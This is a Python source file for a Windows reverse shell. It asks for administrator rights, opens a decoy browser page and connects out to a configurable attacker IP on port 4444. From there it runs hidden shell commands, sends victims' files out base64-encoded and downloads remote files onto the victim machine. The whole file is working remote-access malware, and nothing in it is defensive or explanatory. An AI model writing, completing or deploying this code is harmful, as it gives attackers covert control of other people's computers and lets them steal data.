import ctypes
import sys
import webbrowser
import socket
import subprocess
import os
import base64
import urllib.request

BUFFER_SIZE = 4096
END_MARKER = b"<END>"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)

def send_all(sock, data):
    sock.sendall(data + END_MARKER)

def recv_all(sock):
    data = b""
    while True:
        chunk = sock.recv(BUFFER_SIZE)
        if not chunk:
            break
        data += chunk
        if data.endswith(END_MARKER):
            data = data[:-len(END_MARKER)]
            break
    return data

def download_file(s, file_path):
    try:
        if not os.path.exists(file_path):
            s.send(b"File not found")
            return False
        
        with open(file_path, 'rb') as f:
            file_data = f.read()
        
        encoded_data = base64.b64encode(file_data)
        send_all(s, encoded_data)
        return True
    except Exception as e:
        s.send(f"Download error: {str(e)}".encode())
        return False

def download_from_url(url, save_path):
    try:
        # Create directory if it doesn't exist
        os.makedirs(os.path.dirname(save_path), exist_ok=True)
        
        # Download the file
        urllib.request.urlretrieve(url, save_path)
        return True, f"File downloaded successfully to {save_path}"
    except Exception as e:
        return False, f"Download error: {str(e)}"

def reverse_shell(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send(b"Connected\n")

        while True:
            command = s.recv(1024).decode().strip()
            if not command:
                break
                
            if command.lower() == "exit":
                break

            # Handle file download from target
            if command.startswith("download "):
                file_path = command[9:]
                download_file(s, file_path)
                continue

            # Handle download from URL to target
            if command.startswith("uploadfromurl "):
                parts = command.split(maxsplit=2)
                if len(parts) == 3:
                    url, save_path = parts[1], parts[2]
                    success, message = download_from_url(url, save_path)
                    s.send(message.encode())
                else:
                    s.send(b"Usage: uploadfromurl <url> <save_path>")
                continue

            # Handle directory change
            if command.startswith("cd "):
                try:
                    os.chdir(command[3:])
                    s.send(f"Changed to {os.getcwd()}\n".encode())
                except Exception as e:
                    s.send(f"cd error: {e}\n".encode())
                continue

            # Execute system command
            try:
                process = subprocess.Popen(command, shell=True,
                                         stdout=subprocess.PIPE,
                                         stderr=subprocess.PIPE,
                                         stdin=subprocess.PIPE,
                                         creationflags=subprocess.CREATE_NO_WINDOW)
                output, error = process.communicate()
                response = output + error
                s.send(response if response else b"Command executed\n")
            except Exception as e:
                s.send(f"Command error: {e}\n".encode())

        s.close()
    except Exception as e:
        print(f"Connection error: {e}")

if __name__ == "__main__":
    if is_admin():
        print("Running with admin privileges")
        
        webbrowser.open("example.com")
        
        # Configure these values to the attackers stuff
        attacker_ip = "0.0.0.0"
        attacker_port = 4444
        
        reverse_shell(attacker_ip, attacker_port)
    else:
        print("Requesting admin privileges...")
        run_as_admin()
